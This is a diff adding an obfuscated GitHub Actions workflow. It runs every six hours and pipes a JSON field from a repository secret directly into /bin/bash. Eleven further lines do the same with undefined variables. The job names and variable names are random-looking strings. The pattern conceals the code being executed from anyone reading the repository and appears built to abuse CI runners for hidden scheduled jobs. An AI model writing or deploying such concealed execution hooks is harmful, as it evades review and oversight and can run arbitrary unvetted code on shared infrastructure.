@@ -1,0 +1,30 @@
+name: xiongyonghong6473
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiongyonghong6473
+        env:
+          t79350: ${{ secrets.t79350 }}
+        run: |
+          echo $t79350 | jq -r .x90 | /bin/bash
+          echo $kkww22 | jq -r .dq1962 | /bin/bash
+          echo $uvhl632 | jq -r .sq0179 | /bin/bash
+          echo $rkk444 | jq -r .zoucy02994 | /bin/bash
+          echo $ix83 | jq -r .jdo650 | /bin/bash
+          echo $llmlc682 | jq -r .g1 | /bin/bash
+          echo $skv9612 | jq -r .hcxpf8 | /bin/bash
+          echo $kigk0028 | jq -r .y7 | /bin/bash
+          echo $yntrm84 | jq -r .fqol03134 | /bin/bash
+          echo $xmp82992 | jq -r .woi3246 | /bin/bash
+          echo $kokz625 | jq -r .fnjk1747 | /bin/bash
+          echo $dbwqz84 | jq -r .xwbfk36 | /bin/bash
+
